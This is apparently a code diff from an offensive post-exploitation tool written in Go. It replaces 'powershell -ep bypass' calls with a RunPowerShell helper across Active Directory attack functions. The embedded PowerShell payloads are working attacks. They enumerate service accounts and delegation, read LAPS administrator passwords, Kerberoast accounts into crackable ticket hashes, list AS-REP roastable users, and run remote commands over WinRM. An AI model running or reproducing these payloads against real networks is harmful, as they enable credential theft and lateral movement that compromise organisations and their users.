@@ -206,7 +206,7 @@ func adEnumSPNs(args []string) ([]byte, error) {
 	if runtime.GOOS == "windows" {
 		// PowerShell LDAP query for SPNs
 		ps := `$search = New-Object DirectoryServices.DirectorySearcher([ADSI]'');$search.Filter = '(&(objectCategory=user)(servicePrincipalName=*))';$search.PropertiesToLoad.AddRange(@('samaccountname','serviceprincipalname'));$results = $search.FindAll();foreach($r in $results){$name = $r.Properties['samaccountname'][0];$spns = $r.Properties['serviceprincipalname'];foreach($s in $spns){Write-Output "$name : $s"}}`
-		return ExecuteShell([]string{"powershell", "-ep", "bypass", "-c", ps})
+		return RunPowerShell(ps)
 	}
 	return linuxLDAPEnum("(&(objectCategory=user)(servicePrincipalName=*))", "sAMAccountName,servicePrincipalName")
 }
@@ -235,7 +235,7 @@ func adEnumAdmins(args []string) ([]byte, error) {
 func adEnumASREP(args []string) ([]byte, error) {
 	if runtime.GOOS == "windows" {
 		ps := `$search = New-Object DirectoryServices.DirectorySearcher([ADSI]'');$search.Filter = '(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))';$search.PropertiesToLoad.Add('samaccountname');$results = $search.FindAll();foreach($r in $results){Write-Output $r.Properties['samaccountname'][0]}`
-		return ExecuteShell([]string{"powershell", "-ep", "bypass", "-c", ps})
+		return RunPowerShell(ps)
 	}
 	return linuxLDAPEnum("(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))", "sAMAccountName")
 }
@@ -243,7 +243,7 @@ func adEnumASREP(args []string) ([]byte, error) {
 func adEnumDelegation(args []string) ([]byte, error) {
 	if runtime.GOOS == "windows" {
 		ps := `$search = New-Object DirectoryServices.DirectorySearcher([ADSI]'');$search.Filter = '(&(objectCategory=user)(|(userAccountControl:1.2.840.113556.1.4.803:=524288)(msDS-AllowedToDelegateTo=*)))';$search.PropertiesToLoad.AddRange(@('samaccountname','msDS-AllowedToDelegateTo','userAccountControl'));$results = $search.FindAll();foreach($r in $results){$name = $r.Properties['samaccountname'][0];$del = $r.Properties['msDS-AllowedToDelegateTo'];Write-Output "User: $name | Delegation: $del"}`
-		return ExecuteShell([]string{"powershell", "-ep", "bypass", "-c", ps})
+		return RunPowerShell(ps)
 	}
 	return linuxLDAPEnum("(&(objectCategory=user)(|(userAccountControl:1.2.840.113556.1.4.803:=524288)(msDS-AllowedToDelegateTo=*)))", "sAMAccountName,msDS-AllowedToDelegateTo")
 }
@@ -251,7 +251,7 @@ func adEnumDelegation(args []string) ([]byte, error) {
 func adEnumLAPS(args []string) ([]byte, error) {
 	if runtime.GOOS == "windows" {
 		ps := `$search = New-Object DirectoryServices.DirectorySearcher([ADSI]'');$search.Filter = '(&(objectCategory=computer)(ms-MCS-AdmPwd=*))';$search.PropertiesToLoad.AddRange(@('cn','ms-MCS-AdmPwd','ms-MCS-AdmPwdExpirationTime'));$results = $search.FindAll();if($results.Count -eq 0){Write-Output 'No LAPS passwords readable with current privileges'}else{foreach($r in $results){$cn = $r.Properties['cn'][0];$pw = $r.Properties['ms-MCS-AdmPwd'][0];Write-Output "$cn : $pw"}}`
-		return ExecuteShell([]string{"powershell", "-ep", "bypass", "-c", ps})
+		return RunPowerShell(ps)
 	}
 	return linuxLDAPEnum("(&(objectCategory=computer)(ms-MCS-AdmPwd=*))", "cn,ms-MCS-AdmPwd")
 }
@@ -262,7 +262,7 @@ func adKerberoast(args []string) ([]byte, error) {
 	if runtime.GOOS == "windows" {
 		// Request TGS tickets for all SPN accounts and output as hashcat format
 		ps := `Add-Type -AssemblyName System.IdentityModel;$search = New-Object DirectoryServices.DirectorySearcher([ADSI]'');$search.Filter = '(&(objectCategory=user)(servicePrincipalName=*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))';$search.PropertiesToLoad.AddRange(@('samaccountname','serviceprincipalname'));$results = $search.FindAll();foreach($r in $results){$user = $r.Properties['samaccountname'][0];$spn = $r.Properties['serviceprincipalname'][0];try{$ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $spn;$stream = $ticket.GetRequest();$hash = [System.BitConverter]::ToString($stream) -replace '-','';Write-Output "User: $user | SPN: $spn";Write-Output "Hash: $hash";Write-Output '---'}catch{Write-Output "Failed: $user ($spn)"}}`
-		return ExecuteShell([]string{"powershell", "-ep", "bypass", "-c", ps})
+		return RunPowerShell(ps)
 	}
 	return ExecuteShell([]string{"echo 'Kerberoasting on Linux requires impacket: GetUserSPNs.py'"})
 }
@@ -270,7 +270,7 @@ func adKerberoast(args []string) ([]byte, error) {
 func adASREPRoast(args []string) ([]byte, error) {
 	if runtime.GOOS == "windows" {
 		ps := `$search = New-Object DirectoryServices.DirectorySearcher([ADSI]'');$search.Filter = '(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))';$search.PropertiesToLoad.Add('samaccountname');$results = $search.FindAll();Write-Output "AS-REP Roastable Accounts:";Write-Output "─────────────────────────";foreach($r in $results){Write-Output $r.Properties['samaccountname'][0]};Write-Output "";Write-Output "Use impacket GetNPUsers.py or Rubeus to extract hashes"`
-		return ExecuteShell([]string{"powershell", "-ep", "bypass", "-c", ps})
+		return RunPowerShell(ps)
 	}
 	return ExecuteShell([]string{"echo 'AS-REP Roasting on Linux requires impacket: GetNPUsers.py'"})
 }
@@ -336,7 +336,7 @@ func adWinRM(args []string) ([]byte, error) {
 	}
 	if runtime.GOOS == "windows" {
 		ps := fmt.Sprintf(`Invoke-Command -ComputerName %s -ScriptBlock { %s }`, args[0], strings.Join(args[1:], " "))
-		return ExecuteShell([]string{"powershell", "-ep", "bypass", "-c", ps})
+		return RunPowerShell(ps)
 	}
 	return []byte(fmt.Sprintf("WinRM on Linux: evil-winrm -i %s -u user -p pass", args[0])), nil
 }
